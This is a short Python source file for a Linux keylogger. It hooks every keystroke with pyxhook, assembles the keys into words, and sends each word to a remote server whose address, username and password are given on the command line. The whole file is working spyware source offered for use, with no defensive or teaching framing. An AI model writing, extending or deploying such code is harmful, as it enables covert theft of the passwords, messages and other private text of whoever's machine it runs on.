# Python code for keylogger 
# to be used in linux 
import os 
import pyxhook
#from threading import Lock 
#import pickle
import keyloggerTools
import argparse
import time
  
current_word = ""

def send_word():
	keylogger_client.send_word(current_word)

  

def OnKeyPress(event): 
	log_file = 'log_file'
	
	global current_word
	if event.Key == "space" or event.Key == "Return" :
		send_word()

		current_word = ""
	elif event.Key == "BackSpace":
		current_word= current_word[:len(current_word)-1]
	else:
		current_word = current_word + event.Key

# create a hook manager object 


def main():

	global keylogger_client
	keylogger_client = keyloggerTools.keyloggerClient(args.u, args.a, args.p)
	new_hook = pyxhook.HookManager() 
	new_hook.KeyDown = OnKeyPress 
		# set the hook 
	new_hook.HookKeyboard()

	while 1: 
		try: 
		    new_hook.start()         # start the hook 
		except KeyboardInterrupt: 
		    # User cancelled from command line. 
		    pass
		except Exception as ex: 
		    msg = 'Error while catching events:\n  {}'.format(ex) 


if __name__ == '__main__':
	parser = argparse.ArgumentParser(prog='keyloggerClient',
	        description='Script to send and words')

	parser.add_argument('-a', metavar='ip_addr:port_num', required=True,
        help="Address of the server in the format ip_addr:port_num")

	parser.add_argument('-p', metavar='password', required=True,
	        help="Password to access server")

	parser.add_argument('-u', metavar='username', required=True,
	        help="Username to go by when sending words")

	args = parser.parse_args()

	main()




